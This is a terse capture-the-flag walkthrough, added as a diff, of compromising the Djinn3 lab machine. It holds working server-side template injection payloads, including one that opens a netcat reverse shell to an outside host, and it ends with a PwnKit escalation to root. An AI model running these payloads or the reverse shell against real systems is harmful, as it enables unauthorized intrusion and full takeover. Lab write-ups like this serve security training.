@@ -1,0 +1,102 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.194.102 > Djinn3.txt
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)
+|   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)
+|_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)
+80/tcp    open  http    lighttpd 1.4.45
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-title: Custom-ers
+|_http-server-header: lighttpd/1.4.45
+5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET
+|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+31337/tcp open  Elite?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
+|     username>
+|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+|     username> password> authentication failed
+|   Help: 
+|     username> password>
+|   RPCCheck: 
+|     username> Traceback (most recent call last):
+|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
+|     main()
+|     File "/opt/.tick-serv/tickets.py", line 93, in main
+|     username = input("username> ")
+|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
+|     (result, consumed) = self._buffer_decode(data, self.errors, final)
+|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
+|   SSLSessionReq: 
+|     username> Traceback (most recent call last):
+|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
+|     main()
+|     File "/opt/.tick-serv/tickets.py", line 93, in main
+|     username = input("username> ")
+|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
+|     (result, consumed) = self._buffer_decode(data, self.errors, final)
+|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
+|   TerminalServerCookie: 
+|     username> Traceback (most recent call last):
+|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
+|     main()
+|     File "/opt/.tick-serv/tickets.py", line 93, in main
+|     username = input("username> ")
+|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
+|     (result, consumed) = self._buffer_decode(data, self.errors, final)
+|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+guest, jack
+
+$ nc -nv 192.168.194.102 31337
+(UNKNOWN) [192.168.194.102] 31337 (?) open
+username> guest
+password> guest
+
+> help
+
+        help        Show this menu
+        update      Update the ticketing software
+        open        Open a new ticket
+        close       Close an existing ticket
+        exit        Exit
+    
+> open
+Title: add
+Description: test
+
+http://192.168.194.102:5000/ # Found new ticket add test just added.
+Werkzeug httpd 1.0.1 (Python 3.6.9) Port 5000 run in python
+> open
+Title: {{8*8}} 
+Description: test12
+
+Found the title become 64 when browser to link.
+Refer to https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
+SSTI payload
+Title: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.190 4444 >/tmp/f').read() }}
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.190] from (UNKNOWN) [192.168.194.102] 44412
+bash: cannot set terminal process group (704): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@djinn3:/opt/.web$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# For find .pyc file to exploit. refer to: https://ishsome.medium.com/proving-ground-djinn3-walk-through-96c92bda7942
+
+or use PwnKit as I found pkexec vuln.
+
+www-data@djinn3:/tmp$ ./PwnKit
+mesg: ttyname failed: Inappropriate ioctl for device
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
